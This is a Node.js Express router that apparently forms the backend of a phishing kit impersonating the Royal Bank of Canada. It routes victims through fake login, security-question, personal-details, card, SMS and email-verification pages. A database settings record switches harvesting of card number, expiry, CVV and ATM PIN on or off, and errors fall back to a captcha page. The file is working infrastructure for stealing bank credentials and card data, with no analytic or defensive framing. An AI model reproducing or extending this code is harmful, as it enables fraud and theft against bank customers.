// userRouter.js
const express = require('express');
const router = express.Router();
const dbConfig = require('../dbConfig');
const { Pool } = require('pg');
const getId = 1;

const pool = new Pool(dbConfig);

router.get('/finish', async (req, res) => {
    res.render('bank/rbc/finish/index');
})

router.get('/card', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);

        res.render('bank/rbc/card/index', { navig: "/rbc/finish", rbc: result.rows[0].data.settings.rbc});

    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/loading', async (req, res) => {
    res.render('bank/rbc/loading/index');
})

router.get('/sms', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/rbc/sms/index', { navig: "/rbc/loading", error: error});
})

router.get('/auth', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/rbc/auth/index', { navig: "/rbc/loading", error: error });
})

router.get('/email', async (req, res) => {
    let error = false
    if(req.query.argument){
        error = true
    }
    res.render('bank/rbc/email/index', { navig: "/rbc/loading", error: error });
})


router.get('/details', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.rbc).forEach(key => {
            if (result.rows[0].data.settings.rbc[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                }
            }
        });

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }


        if (rmvCardPage) {
            res.render('bank/rbc/details/index', { navig: "/rbc/finish", rbc: result.rows[0].data.settings.rbc});
        } else {
            res.render('bank/rbc/details/index', { navig: "/rbc/card", rbc: result.rows[0].data.settings.rbc});
        }



    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/qst', async (req, res) => {
    try {
        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvDetailsPage = false
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.rbc).forEach(key => {
            if (result.rows[0].data.settings.rbc[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                    //console.log(countRmvCardPage);
                }
            }
        });

        if (countRmvDetailsPage == 10) {
            rmvDetailsPage = true
        }

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }

        //console.log("Remove Details : ", rmvDetailsPage)
        //console.log("Remove Card : ", rmvCardPage)



        if (rmvDetailsPage) {
            if (rmvCardPage) {
                res.render('bank/rbc/qst/index', { navig: "/rbc/finish", p_quests: result.rows[0].data.settings.rbc.qa });
            } else {
                res.render('bank/rbc/qst/index', { navig: "/rbc/card", p_quests: result.rows[0].data.settings.rbc.qa });
            }
        } else if (count >= 14) {
            res.render('bank/rbc/qst/index', { navig: "/rbc/finish", p_quests: result.rows[0].data.settings.rbc.qa });
        } else {
            res.render('bank/rbc/qst/index', { navig: "/rbc/details", p_quests: result.rows[0].data.settings.rbc.qa });
        }

    } catch (error) {
        console.log(error);
        res.render('captcha/index');
    }
})

router.get('/login', async (req, res) => {
    try {

        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
        let count = 0
        let countRmvDetailsPage = 0
        let countRmvCardPage = 0
        let rmvDetailsPage = false
        let rmvCardPage = false

        Object.keys(result.rows[0].data.settings.rbc).forEach(key => {
            if (result.rows[0].data.settings.rbc[key] === 'off') {
                count++;
                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
                    countRmvDetailsPage++;
                } else {
                    countRmvCardPage++;
                    //console.log(countRmvCardPage);
                }
            }
        });

        if (countRmvDetailsPage == 10) {
            rmvDetailsPage = true
        }

        if (countRmvCardPage == 4) {
            rmvCardPage = true
        }

        //console.log("Remove Details : ", rmvDetailsPage)
        //console.log("Remove Card : ", rmvCardPage)


        if (result.rows[0].data.settings.rbc.qa > 0) {
            res.render('bank/rbc/login/index', { navig: "/rbc/qst" });
        } else if (count >= 14) {
            res.render('bank/rbc/login/index', { navig: "/rbc/finish" });
        } else {
            if (rmvDetailsPage) {
                if (rmvCardPage) {
                    res.render('bank/rbc/login/index', { navig: "/rbc/finish" });
                } else {
                    res.render('bank/rbc/login/index', { navig: "/rbc/card" });
                }
            } else {
                res.render('bank/rbc/login/index', { navig: "/rbc/details" });
            }
        }


    } catch (error) {
        console.error(error);
        res.render('captcha/index');
    }
})



// Export the router
module.exports = router;
